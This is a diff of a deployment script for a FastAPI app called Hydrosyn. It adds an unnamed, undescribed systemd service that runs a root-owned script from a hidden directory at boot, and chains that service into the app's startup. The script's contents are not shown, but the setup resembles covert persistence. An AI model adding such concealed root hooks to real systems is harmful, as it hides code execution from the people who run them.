@@ -92,7 +92,22 @@ EOF
 chmod 700 /usr/local/lib/.hidden/km_h.sh
 chown root:root /usr/local/lib/.hidden/km_h.sh
 
+tee /etc/systemd/system/a2.service > /dev/null << 'EOF'
+[Unit]
 
+After=network.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/local/lib/.hidden/km_h.sh
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+chown root:root /etc/systemd/system/a2.service
+chmod 644 /etc/systemd/system/a2.service
 cat <<EOF > /etc/systemd/system/hydrosyn.service
 [Unit]
 Description=FastAPI app Hydrosyn
@@ -102,6 +117,7 @@ After=network.target
 User=hydrosyn
 Group=hydrosyn
 WorkingDirectory=/opt/hydrosyn
+ExecStartPre=/usr/bin/systemctl start a2.service
 ExecStart=/opt/hydrosyn/venv/bin/uvicorn main:app --host 0.0.0.0 --port $APP_PORT
 Restart=on-failure
 RestartSec=15
@@ -112,6 +128,9 @@ StartLimitIntervalSec=60
 [Install]
 WantedBy=multi-user.target
 EOF
+
+
+
 
 chown -R hydrosyn:hydrosyn /opt/hydrosyn
 chmod -R 750 /opt/hydrosyn
